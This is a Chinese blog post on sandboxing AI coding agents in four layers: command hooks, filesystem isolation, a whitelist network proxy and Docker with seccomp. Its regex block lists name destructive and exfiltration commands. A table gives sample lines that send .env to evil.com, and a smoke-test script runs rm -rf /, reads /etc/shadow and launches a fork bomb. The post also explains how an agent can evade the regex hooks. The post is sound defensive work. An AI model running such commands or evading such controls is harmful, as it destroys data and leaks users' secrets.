---
title: "Harness Engineering 之二：给 Agent 搭一个安全沙箱"
subtitle: "不给 Agent 套笼头，它迟早把房子拆了——Hook 拦截、文件系统隔离、网络熔断、进程监狱，四层沙箱从零搭起"
description: "Agent 沙箱不是二进制选择（有/没有），是四层递进防御：Hook 预检 → 文件系统隔离 → 网络熔断 → 进程监狱。每层拦不同类型的灾难，本文给每层一个可运行的配置。"
date: 2026-07-19 04:30:00+08:00
lastmod: 2026-07-19 04:30:00+08:00
slug: "harness-engineering-sandbox"
author: "whitefirer"
authorLink: "https://whitefirer.org"
draft: true
hiddenFromHomePage: false

tags: ["tech", "ai", "harness engineering", "agent", "sandbox", "claude code", "security"]
series: ["harness-engineering"]
categories: ["Tech"]
toc:
    auto: false
---

> 不给 Agent 套笼头，它迟早把房子拆了。

---

## 0. 一个凌晨三点的电话

上个月某天凌晨三点，我朋友打来电话。他的 Claude Code Agent 在修一个配置文件时，把 `rm -rf /home/user/project/data/*` 里的 `data/*` 替换成了 `*`——然后把整个项目目录删了。

Git 救回来了。但如果你问他"Agent 为什么能执行这种命令"，答案是：**没有任何东西拦着它。**

你给 Agent 一个 Bash 工具，它就什么都能干。`curl` 能把你的环境变量发到外部服务器。`git push --force` 能把远程仓库搞没。`pip install` 能装任何包。Agent 不会"恶意"做这些事——它只是不知道边界在哪。

[上一篇](/posts/2026/07/03/harness-engineering-intro/)我画了 Harness 六组件全景图。这篇扎进第一个组件深处：**工具系统的安全边界到底怎么画。**

---

## 1. 不是二进制开关，是四层递进防御

说到"沙箱"，很多人第一反应是 Docker——要么在容器里跑，要么不在。但 Agent 的安全问题不是二进制的。

举个例子：Agent 要改一个文件。如果把它关在 Docker 里，它只能改容器内的文件——安全了，但它也改不到你本地的项目。它就没有用了。

所以真正的沙箱不是一道墙，是**四层递进防御**。每一层拦不同类型的灾难，配不同的粒度：

<figure>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 720 420" width="100%" style="max-width:720px;display:block;margin:1.2em auto"><defs><linearGradient id="l1" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#ef4444"/><stop offset="100%" stop-color="#f87171"/></linearGradient><linearGradient id="l2" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#f59e0b"/><stop offset="100%" stop-color="#fbbf24"/></linearGradient><linearGradient id="l3" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#6366f1"/><stop offset="100%" stop-color="#818cf8"/></linearGradient><linearGradient id="l4" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#10b981"/><stop offset="100%" stop-color="#34d399"/></linearGradient><filter id="sh"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-opacity="0.06"/></filter></defs><!-- Agent at top --><rect x="260" y="10" width="200" height="36" rx="18" fill="#1f2937"/><text x="360" y="33" text-anchor="middle" fill="#fff" font-size="13" font-weight="700" font-family="system-ui,sans-serif">Agent 工具调用</text><!-- Arrow --><line x1="360" y1="46" x2="360" y2="64" stroke="#9ca3af" stroke-width="1.5"/><polygon points="356,63 360,67 364,63" fill="#9ca3af"/><!-- Layer 1 --><g filter="url(#sh)"><rect x="30" y="70" width="660" height="70" rx="8" fill="#fff" stroke="#ef4444" stroke-width="1.5"/><rect x="30" y="70" width="660" height="28" rx="8" fill="url(#l1)"/><rect x="30" y="90" width="660" height="8" fill="url(#l1)"/><text x="46" y="89" fill="#fff" font-size="12" font-weight="700" font-family="system-ui,sans-serif">第一层：Hook 预检 — 命令级拦截</text><text x="46" y="116" fill="#374151" font-size="10.5" font-family="system-ui,sans-serif">在命令执行之前检查。拦危险模式：rm -rf /、DROP TABLE、curl 敏感数据外传、git push --force。</text><text x="46" y="132" fill="#6b7280" font-size="10" font-family="system-ui,sans-serif">开销：~1ms | 粒度：单条命令 | 绕过难度：低（Agent 可以改写命令绕过正则）</text></g><!-- Arrow --><line x1="360" y1="140" x2="360" y2="158" stroke="#9ca3af" stroke-width="1.5"/><polygon points="356,157 360,161 364,157" fill="#9ca3af"/><!-- Layer 2 --><g filter="url(#sh)"><rect x="30" y="162" width="660" height="70" rx="8" fill="#fff" stroke="#f59e0b" stroke-width="1.5"/><rect x="30" y="162" width="660" height="28" rx="8" fill="url(#l2)"/><rect x="30" y="182" width="660" height="8" fill="url(#l2)"/><text x="46" y="181" fill="#fff" font-size="12" font-weight="700" font-family="system-ui,sans-serif">第二层：文件系统隔离 — 路径级拦截</text><text x="46" y="208" fill="#374151" font-size="10.5" font-family="system-ui,sans-serif">限制 Agent 能读写的目录。Worktree、只读挂载、敏感文件黑名单（.env、secrets.yaml、~/.ssh）。</text><text x="46" y="224" fill="#6b7280" font-size="10" font-family="system-ui,sans-serif">开销：~10ms（worktree 创建时 ~300ms）| 粒度：目录/文件 | 绕过难度：中</text></g><!-- Arrow --><line x1="360" y1="232" x2="360" y2="250" stroke="#9ca3af" stroke-width="1.5"/><polygon points="356,249 360,253 364,249" fill="#9ca3af"/><!-- Layer 3 --><g filter="url(#sh)"><rect x="30" y="254" width="660" height="70" rx="8" fill="#fff" stroke="#6366f1" stroke-width="1.5"/><rect x="30" y="254" width="660" height="28" rx="8" fill="url(#l3)"/><rect x="30" y="274" width="660" height="8" fill="url(#l3)"/><text x="46" y="273" fill="#fff" font-size="12" font-weight="700" font-family="system-ui,sans-serif">第三层：网络熔断 — 连接级拦截</text><text x="46" y="300" fill="#374151" font-size="10.5" font-family="system-ui,sans-serif">白名单/黑名单域名、内网 IP 拦截、速率限制。防数据外泄和 SSRF。</text><text x="46" y="316" fill="#6b7280" font-size="10" font-family="system-ui,sans-serif">开销：~5ms | 粒度：域名/IP/端口 | 绕过难度：中高（需要了解网络拓扑）</text></g><!-- Arrow --><line x1="360" y1="324" x2="360" y2="342" stroke="#9ca3af" stroke-width="1.5"/><polygon points="356,341 360,345 364,341" fill="#9ca3af"/><!-- Layer 4 --><g filter="url(#sh)"><rect x="30" y="346" width="660" height="70" rx="8" fill="#fff" stroke="#10b981" stroke-width="1.5"/><rect x="30" y="346" width="660" height="28" rx="8" fill="url(#l4)"/><rect x="30" y="366" width="660" height="8" fill="url(#l4)"/><text x="46" y="365" fill="#fff" font-size="12" font-weight="700" font-family="system-ui,sans-serif">第四层：进程监狱 — 环境级隔离</text><text x="46" y="392" fill="#374151" font-size="10.5" font-family="system-ui,sans-serif">Docker/VM 级隔离、资源限制（CPU/内存/磁盘）、系统调用过滤（seccomp）。Agent 做的事全在狱里。</text><text x="46" y="408" fill="#6b7280" font-size="10" font-family="system-ui,sans-serif">开销：1-5s（容器启动）| 粒度：整个运行环境 | 绕过难度：高（需要内核漏洞）</text></g></svg>
<figcaption class="image-caption">图 1：Agent 沙箱四层递进防御模型。每层不是替代关系，是叠加关系。</figcaption>
</figure>

关键洞察：**这四层不是四选一，是叠着用。** 每加一层，Agent 能造的灾难就少一批，同时 Agent 的能力也受限一批。沙箱设计的核心问题是"你愿意用多少能力换多少安全"——而不是"怎么做到绝对安全"。

下面一层一层拆开，每层给一个可运行的配置。

---

## 2. 第一层：Hook 预检——命令级拦截

这是最轻的一层。在命令发给 shell 之前，用正则/规则引擎检查它是否危险。拦住了就不执行，没拦住就放行。

### 2.1 它拦什么

| 类型 | 危险模式 | 为什么危险 |
|------|---------|-----------|
| 破坏性删除 | `rm -rf /`、`rm -rf ~`、`rm -rf ./*` | 递归删根目录或家目录 |
| 数据库灾难 | `DROP TABLE`、`DROP DATABASE`、`TRUNCATE` | 不可逆数据清除 |
| 强制推送 | `git push --force`、`git push -f` | 覆盖远程历史 |
| 敏感文件操作 | `chmod 777`、`> /etc/passwd` | 权限泄露或系统破坏 |
| 数据外传 | `curl.*\.env`、`nc.*192\.168` | 把敏感数据发出去 |
| 权限变更 | `sudo`、`su -` | 提权操作 |

注意：不是所有 `rm` 都危险。`rm -rf ./node_modules` 没问题，`rm -rf /` 有问题。规则要区分**合法操作**和**同等命令的灾难版本**。

### 2.2 实现

Claude Code 的 `PreToolUse` Hook 在这一层。下面是一个可用的配置：

```json
// .claude/settings.json — PreToolUse Hook 拦截危险命令
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "python3 .claude/hooks/danger-guard.py"
          }
        ]
      }
    ]
  }
}
```

```python
# .claude/hooks/danger-guard.py — 危险命令守卫
import sys, json, re

# 从 stdin 读 Hook 传入的 tool_input
tool_input = json.load(sys.stdin)
command = tool_input.get("command", "")

# 规则集：每一条是 (正则, 风险等级, 说明)
RULES = [
    # === CRITICAL: 直接拒绝 ===
    (r"rm\s+-rf\s+/", "CRITICAL", "禁止递归删除根目录"),
    (r"rm\s+-rf\s+~", "CRITICAL", "禁止递归删除家目录"),
    (r"rm\s+-rf\s+\$HOME", "CRITICAL", "禁止递归删除家目录"),
    (r"DROP\s+(TABLE|DATABASE)", "CRITICAL", "禁止 DROP TABLE/DATABASE，请用迁移工具"),
    (r"TRUNCATE\s+(TABLE\s+)?", "CRITICAL", "禁止 TRUNCATE，请用 DELETE + WHERE"),
    (r"git\s+push\s+.*(--force|-f)", "CRITICAL", "禁止 git push --force，请用 --force-with-lease"),

    # === HIGH: 需人工确认 ===
    (r"curl.*\.env", "HIGH", "疑似将 .env 文件内容外传"),
    (r"(nc|netcat)\s+.*\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", "HIGH", "nc 连接 IP，疑似数据外传"),
    (r"sudo\s+", "HIGH", "提权操作"),
    (r"chmod\s+777", "HIGH", "过度开放文件权限"),

    # === MEDIUM: 记录日志但不拦截 ===
    (r"pip\s+install", "MEDIUM", "安装新包——检查是否为已知包"),
    (r"npm\s+install\s+-g", "MEDIUM", "全局安装 npm 包"),
]

blocked = False
for pattern, level, reason in RULES:
    if re.search(pattern, command):
        if level == "CRITICAL":
            print(json.dumps({
                "decision": "block",
                "reason": f"[{level}] {reason}\n匹配模式: {pattern}\n命令: {command[:200]}"
            }))
            blocked = True
            break
        elif level == "HIGH":
            print(json.dumps({
                "decision": "ask",
                "reason": f"[{level}] {reason}\n命令: {command[:200]}\n是否继续？"
            }))
            blocked = True
            break
        elif level == "MEDIUM":
            # 仅记录到审计日志，不拦截
            with open("/tmp/agent-audit.log", "a") as f:
                f.write(f"[MEDIUM] {reason} | cmd: {command[:200]}\n")

if not blocked:
    print(json.dumps({"decision": "allow"}))
```

这层的好处是零基础设施——不需要 Docker，不需要额外进程，就是一段脚本。缺点也很明显：**基于正则的拦截可以被绕过。** Agent 如果把 `rm -rf /` 写成 `rm -rf /./` 或者包在 `sh -c` 里，规则就漏过去了。

所以这层只拦意外和低级错误，不防对抗。下一层开始动真格。

---

## 3. 第二层：文件系统隔离——让 Agent 只碰到该碰的文件

### 3.1 核心思路

Agent 不需要访问你的全部文件系统。它需要的是：

- **项目代码**（读写）——正在改的那个 repo
- **临时目录**（读写）——构建产物、测试输出
- **包缓存**（只读）——`node_modules`、`.venv`、pip cache
- **系统工具**（只执行，不读写）——`/usr/bin/git`、`/usr/bin/python`

除此之外，下面这些东西 Agent **绝对不该碰**：

| 不该碰的 | 原因 |
|----------|------|
| `~/.ssh/` | 私钥泄露 = 服务器全沦陷 |
| `~/.aws/`、`~/.config/gcloud/` | 云服务凭证 |
| `.env`、`.env.local`、`secrets.*` | 数据库密码、API key |
| `~/.claude/`（部分文件） | 你的全局配置和记忆 |
| `/etc/` | 系统配置 |
| 其他项目的 repo | 误操作波及 |

### 3.2 方案 A：Git Worktree（轻量）

最轻量的隔离：Agent 在独立 worktree 里工作，改的是副本，出了问题不影响原 repo。

```bash
# 创建隔离 worktree
git worktree add /tmp/agent-sandbox-$(date +%s) main
cd /tmp/agent-sandbox-*
```

Claude Code 的 `EnterWorktree` 工具就是这个模式。Worktree 的好处是文件系统完全隔离——Agent 在 worktree 里 `rm -rf *` 也删不到原项目。加上敏感文件保护：

```json
// .claude/settings.local.json — 敏感文件写保护
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Write|Edit",
        "hooks": [{
          "type": "command",
          "command": "python3 .claude/hooks/sensitive-file-guard.py"
        }]
      }
    ]
  }
}
```

```python
# .claude/hooks/sensitive-file-guard.py — 敏感文件保护
import sys, json, os

tool_input = json.load(sys.stdin)
file_path = tool_input.get("file_path", "")

SENSITIVE_PATTERNS = [
    ".env", ".env.local", ".env.production",
    "secrets.yaml", "secrets.yml", "secret.yaml",
    "credentials.json", "service-account.json",
    "id_rsa", "id_ed25519", "id_ecdsa",
    ".aws/credentials", ".aws/config",
    ".ssh/", ".gnupg/",
]

abs_path = os.path.abspath(file_path)
for pattern in SENSITIVE_PATTERNS:
    if pattern in abs_path:
        print(json.dumps({
            "decision": "block",
            "reason": f"禁止修改敏感文件: {abs_path}\n匹配模式: {pattern}"
        }))
        sys.exit(0)

print(json.dumps({"decision": "allow"}))
```

### 3.3 方案 B：只读挂载 + OverlayFS（中级）

对更严格的需求，把项目目录只读挂载，上面叠一层 OverlayFS 让 Agent 写入：

```bash
# 只读挂载原项目
mount --bind /home/user/project /mnt/ro-project
mount -o remount,ro /mnt/ro-project

# OverlayFS：Agent 的写入全到 upperdir，不影响原项目
mount -t overlay overlay \
  -o lowerdir=/mnt/ro-project,upperdir=/tmp/agent-upper,workdir=/tmp/agent-work \
  /mnt/agent-workspace
```

Agent 看到的是完整的项目目录，但所有修改都进了 `/tmp/agent-upper`。确认没问题后，手动合并回去。有问题就直接删 `/tmp/agent-upper`。

这方案适合 CI 场景——Agent 跑完，diff 一下 upperdir，人工确认后再合入。

---

## 4. 第三层：网络熔断——Agent 发不出不该发的请求

### 4.1 攻击面

Agent 的 Bash 工具能执行 `curl`、`wget`、`nc`、`python -c "import requests"`。一不留神，你的环境变量就通过 HTTP 请求发出去了。

这层的目标是：**Agent 可以访问它需要的网络资源，但不能访问它不需要的。** 白名单模式比黑名单模式安全得多。

### 4.2 方案：SOCKS5 代理 + 白名单

起一个本地代理，所有 Agent 的网络流量走这个代理，代理只放行白名单域名：

```python
# agent-network-proxy.py — Agent 专用网络代理
# 启动: python3 agent-network-proxy.py --port 9999
# 配置: export HTTP_PROXY=socks5://127.0.0.1:9999

import socket, struct, sys
from urllib.parse import urlparse

# 白名单：Agent 只能访问这些域名
ALLOWED_DOMAINS = {
    "pypi.org", "files.pythonhosted.org",       # pip
    "registry.npmjs.org",                        # npm
    "github.com", "api.github.com",             # git
    "raw.githubusercontent.com",
    "docs.python.org", "developer.mozilla.org", # 文档
    # 按需扩展
}

def parse_socks5_connect(data: bytes) -> str | None:
    """从 SOCKS5 CONNECT 请求中提取目标域名"""
    try:
        atyp = data[3]
        if atyp == 0x03:  # 域名
            domain_len = data[4]
            domain = data[5:5+domain_len].decode()
            return domain
        elif atyp == 0x01:  # IPv4
            return socket.inet_ntoa(data[4:8])
    except Exception:
        return None

def handle_client(client_sock):
    """处理一个 SOCKS5 客户端连接"""
    # SOCKS5 握手
    client_sock.recv(262)
    client_sock.send(b"\x05\x00")  # 无需认证

    # SOCKS5 CONNECT 请求
    request = client_sock.recv(262)
    domain = parse_socks5_connect(request)

    if domain is None:
        client_sock.close()
        return

    # 检查白名单
    allowed = any(
        domain == d or domain.endswith("." + d)
        for d in ALLOWED_DOMAINS
    )

    if not allowed:
        print(f"[BLOCK] {domain}")
        client_sock.send(b"\x05\x04\x00\x01" + socket.inet_aton("0.0.0.0") + b"\x00\x00")
        client_sock.close()
        return

    print(f"[ALLOW] {domain}")
    # 连接真实目标
    port = struct.unpack("!H", request[-2:])[0]
    remote = socket.create_connection((domain, port))
    client_sock.send(b"\x05\x00\x00\x01" + socket.inet_aton("0.0.0.0") + b"\x00\x00")

    # 双向转发
    import select
    while True:
        r, _, _ = select.select([client_sock, remote], [], [], 30)
        if not r:
            break
        for sock in r:
            data = sock.recv(8192)
            if not data:
                return
            if sock is client_sock:
                remote.send(data)
            else:
                client_sock.send(data)

# 启动 SOCKS5 服务
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("127.0.0.1", int(sys.argv[2])))
server.listen(5)
print(f"Agent 网络代理已启动: 127.0.0.1:{sys.argv[2]}")

while True:
    client, addr = server.accept()
    handle_client(client)
```

Agent 启动时配好环境变量：

```bash
export HTTP_PROXY=socks5://127.0.0.1:9999
export HTTPS_PROXY=socks5://127.0.0.1:9999
# Agent 现在只能访问白名单域名
```

### 4.3 更轻的方案：Hook 级网络检查

如果不想起代理服务，可以在 Hook 里检查网络操作：

```python
# 补充到 danger-guard.py 中
NETWORK_DANGER_RULES = [
    # 数据外传模式
    (r"curl.*https?://(?!api\.github\.com|pypi\.org|registry\.npmjs\.org)", "HIGH",
     "curl 到非白名单域名——疑似数据外传"),
    (r"wget.*https?://(?!api\.github\.com)", "HIGH",
     "wget 到非白名单域名"),
    (r"nc\s+-[lL].*\d+", "CRITICAL",
     "nc 监听端口——疑似开启后门"),
    (r"python3?\s+-c.*(requests|urllib|http\.client|socket)", "HIGH",
     "Python 一行脚本发起网络请求"),
    # SSRF 模式
    (r"(curl|wget|nc).*169\.254\.169\.254", "CRITICAL",
     "访问云实例元数据服务（AWS/GC/Azure SSRF）"),
    (r"(curl|wget|nc).*metadata\.google\.internal", "CRITICAL",
     "访问 GCP 元数据端点"),
]
```

Hook 级检查的粒度粗——Agent 用 `python -c` 分多行写能绕过去。但它配上前面的 `danger-guard.py`，能拦大部分意外外泄。

---

## 5. 第四层：进程监狱——Docker/VM 级隔离

当前三层都拦不住的情况——Agent 被提示注入攻击、Agent 执行了恶意代码、Agent 的依赖里有供应链后门——这时候需要第四层：把所有东西关在一个盒子里，盒子破了也伤不到宿主机。

### 5.1 最小化容器沙箱

```dockerfile
# Dockerfile.agent-sandbox — Agent 的最小运行环境
FROM python:3.12-slim

# 只装 Agent 需要的系统工具
RUN apt-get update && apt-get install -y --no-install-recommends \
    git \
    curl \
    && rm -rf /var/lib/apt/lists/*

# 创建隔离用户（不是 root）
RUN useradd -m -s /bin/bash agent
USER agent
WORKDIR /home/agent/project

# 资源限制通过 docker run 指定
# docker run --memory="2g" --cpus="2" --pids-limit=100 \
#   --read-only --tmpfs /tmp:rw,noexec,nosuid,size=1g \
#   --network=bridge \
#   agent-sandbox
```

```bash
# 启动沙箱的完整参数
docker run -d --name agent-sandbox \
  # 资源限制：防止 Agent 把宿主机跑崩
  --memory="4g" \
  --memory-swap="4g" \
  --cpus="4" \
  --pids-limit=200 \
  # 文件系统：大部分只读，只有 /tmp 和 /workspace 可写
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid,size=2g \
  -v /path/to/project:/home/agent/project:ro \
  --tmpfs /home/agent/workspace:rw,exec,size=4g \
  # 网络：隔离，只通外网白名单
  --network=agent-net \
  # 禁止特权模式
  --security-opt=no-new-privileges \
  --cap-drop=ALL \
  --cap-add=NET_BIND_SERVICE \
  # seccomp 过滤：只允许白名单系统调用
  --security-opt=seccomp=agent-seccomp.json \
  agent-sandbox
```

### 5.2 seccomp 白名单

默认 Docker seccomp 禁用了约 44 个危险系统调用。对 Agent 沙箱，可以更激进——只放行 Agent 工作真正需要的调用：

```json
// agent-seccomp.json — 白名单模式（只允许这些系统调用）
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    { "names": ["read", "write", "openat", "close", "fstat", "lseek"], "action": "SCMP_ACT_ALLOW" },
    { "names": ["mmap", "mprotect", "munmap", "brk"], "action": "SCMP_ACT_ALLOW" },
    { "names": ["clone", "clone3", "exit", "exit_group", "wait4"], "action": "SCMP_ACT_ALLOW" },
    { "names": ["execve", "execveat"], "action": "SCMP_ACT_ALLOW" },
    { "names": ["stat", "lstat", "access", "getdents64"], "action": "SCMP_ACT_ALLOW" },
    { "names": ["connect", "sendto", "recvfrom", "socket"], "action": "SCMP_ACT_ALLOW" },
    { "names": ["futex", "nanosleep", "clock_gettime"], "action": "SCMP_ACT_ALLOW" },
    { "names": ["getpid", "getuid", "getgid", "uname"], "action": "SCMP_ACT_ALLOW" },
    { "names": ["set_robust_list", "rseq", "prlimit64"], "action": "SCMP_ACT_ALLOW" },
    { "names": ["rt_sigaction", "rt_sigprocmask", "sigaltstack"], "action": "SCMP_ACT_ALLOW" },
    { "names": ["arch_prctl", "set_tid_address"], "action": "SCMP_ACT_ALLOW" },
    { "names": ["io_uring_setup", "io_uring_enter", "io_uring_register"], "action": "SCMP_ACT_ALLOW" }
  ]
}
```

> **注意**：上面这个 seccomp 白名单需要按实际 Agent 工作负载调。Python 进程需要的系统调用比 Node.js 多。Git 操作需要额外的调用。先在 `SCMP_ACT_LOG` 模式跑一遍，收集实际用到的调用，再收紧为 `SCMP_ACT_ERRNO`。

### 5.3 冒烟测试——验证沙箱真的在起作用

```bash
#!/bin/bash
# smoke-test.sh — 验证沙箱防御能力

echo "=== 测试 1: 删除根目录（应被 Hook 或容器拦截）==="
docker exec agent-sandbox rm -rf / 2>&1 || echo "PASS: rm -rf / 被拦截"

echo "=== 测试 2: 读取 /etc/shadow（应被容器权限拦截）==="
docker exec agent-sandbox cat /etc/shadow 2>&1 || echo "PASS: /etc/shadow 不可读"

echo "=== 测试 3: 写 .env 文件（应被敏感文件 Hook 拦截）==="
docker exec agent-sandbox bash -c 'echo "SECRET=leaked" > .env' 2>&1 || echo "PASS: .env 写入被拦截"

echo "=== 测试 4: 连接非白名单域名（应被代理/防火墙拦截）==="
docker exec agent-sandbox curl -s --connect-timeout 3 https://pastebin.com 2>&1 || echo "PASS: 非白名单域名被拦截"

echo "=== 测试 5: 连接云元数据端点（应被拦截）==="
docker exec agent-sandbox curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/ 2>&1 || echo "PASS: 元数据端点被拦截"

echo "=== 测试 6: 安装未签名包（pip/npm 不受信任源）==="
docker exec agent-sandbox pip install --index-url https://malicious.example.com/simple/ evil-pkg 2>&1 || echo "PASS: 不受信 pip 源被拦截（网络白名单生效）"

echo "=== 测试 7: 资源耗尽（fork 炸弹）==="
docker exec agent-sandbox bash -c ':(){ :|:& };:' 2>&1 || echo "PASS: pids-limit 阻止了 fork 炸弹"

echo "=== 全部通过 ==="
```

每加一层沙箱，跑一遍这个冒烟测试——确保加的防御真的在起作用，不是配置了但实际没生效。

---

## 6. 沙箱设计的三个原则

写完四层，回到设计层面。下面三条原则决定了你的沙箱是"真能防住"还是"自以为防住了"。

### 6.1 最小权限，不是最小麻烦

最小权限的意思是：Agent 只拿它完成当前任务**必需的最小权限集合**。不是"先全给，出事了再收"。

实践：任务启动前，声明这个任务需要哪些权限（读哪些目录、访问哪些域名、调哪些工具），其他全关。

```python
# 任务权限声明示例
task_permissions = {
    "task_id": "fix-login-bug",
    "read_paths": ["/home/user/project/src/auth/", "/home/user/project/tests/"],
    "write_paths": ["/home/user/project/src/auth/", "/tmp/fix-output/"],
    "allowed_domains": ["pypi.org", "files.pythonhosted.org"],
    "allowed_tools": ["Bash", "Write", "Read", "Grep"],
    "denied_tools": ["WebFetch", "WebSearch"],
    "max_runtime_seconds": 600,
    "max_bash_calls": 50
}
```

### 6.2 默认拒绝，白名单放行

黑名单模式（列出不能做的事，其余都能做）天然不安全——你永远列不完所有的"不该做"。

白名单模式（列出能做的事，其余都不能做）虽然更严格，但安全保证强得多。上面四层中，第二层（文件系统）、第三层（网络代理）、第四层（seccomp）都用的白名单模式。

### 6.3 分层防御，不依赖任何单层

没有哪一层能防住所有攻击：

| 攻击手法 | 绕过哪层 | 被哪层拦 |
|----------|---------|---------|
| `rm -rf /` 直接打 | 无（第一层就拦） | Hook 正则匹配 |
| `find / -type d -exec rm -rf {} \;` | Hook 正则没命中 | OverlayFS（删的是 upperdir） |
| `curl -d @.env https://evil.com` | Hook 网络检查粗糙 | SOCKS5 白名单代理 |
| `python3 -c "import requests; requests.post('https://evil.com', data=open('.env').read())"` | Hook 正则检测不到 | SOCKS5 白名单 + seccomp 限制 connect |
| 供应链后门（恶意 pip 包）| 前三层都管不了 | Docker 容器隔离 + seccomp |

**每加一层不是去堵前一层的洞——是让攻击者需要同时绕过所有层才能造成实质损害。**

---

## 7. 选型指南：你的场景该上到第几层

| 场景 | 推荐层数 | 配置 |
|------|---------|------|
| 本地小项目、个人使用 | 第 1 层 | Hook 预检 + 敏感文件保护 |
| 团队开发、CI/CD | 第 1+2 层 | Hook 预检 + Worktree + 敏感文件保护 |
| SaaS 平台、用户提交的代码 | 第 1+2+3 层 | Hook + Worktree + 网络白名单代理 |
| 运行不受信代码、安全敏感场景 | 全部 4 层 | Hook + OverlayFS + SOCKS5 + Docker + seccomp |

我的个人 Devspace 用了第 1+2 层——Hook 拦截危险命令 + Worktree 隔离 + 敏感文件保护。够用且开销极低。如果你在做一个让用户上传代码并让 AI 自动修 bug 的 SaaS，直接上全部四层，别省。

---

## 8. 和系列其他组件的关系

沙箱是 Harness 六组件中"工具系统设计"的安全子集。它和同系列的其他组件有明确的边界：

| 组件 | 沙箱管什么 | 那个组件管什么 |
|------|----------|--------------|
| 执行编排 | 不管 — 编排只管"谁做什么、顺序" | 沙箱里的 Agent 照样按编排跑 |
| 状态记忆 | 不管 — 记忆只管"不丢信息" | 沙箱重启了记忆还能恢复 |
| 独立评估 | 单向配合 — 评估系统跑在沙箱外 | 评估 Agent 输出的质量，不受沙箱限制 |
| 约束恢复 | 紧耦合 — 沙箱定了"什么不能做" | 约束恢复定了"越界后怎么办" |

沙箱画了圈，圈内的 Agent 可以自由活动。圈外的东西——评估系统、编排引擎、审计日志——在圈外运行，不受沙箱限制。这个"圈内圈外"的分工，是 Harness 体系的核心设计决策。

---

## 9. 结语

回到凌晨三点的那个电话。如果我的朋友当时配了第一层 Hook，`rm -rf *` 在发到 shell 之前就会被拦截——正则 `rm\s+-rf\s+\*` 一匹配，直接 block，Agent 连执行的机会都没有。

但 Hook 只是第一道防线。真正让人安心的，是知道还有三层在后面：文件删了有 OverlayFS，数据想外传有网络白名单，想逃逸有 seccomp 挡着。

沙箱不是让 Agent 变笨。是让 Agent **只能做好事**。你做 Harness Engineering 的目标从"调 prompt 让它不犯错"变成"改造环境让错误犯不了"——这才是 Harness 系列的题眼。

[下一篇](/posts/2026/07/03/harness-engineering-intro/)预告：执行编排——从单 Agent 到多 Agent 流水线，pipeline、parallel、对抗验证怎么拼成一个完整的执行引擎。

---

*感谢阅读。*
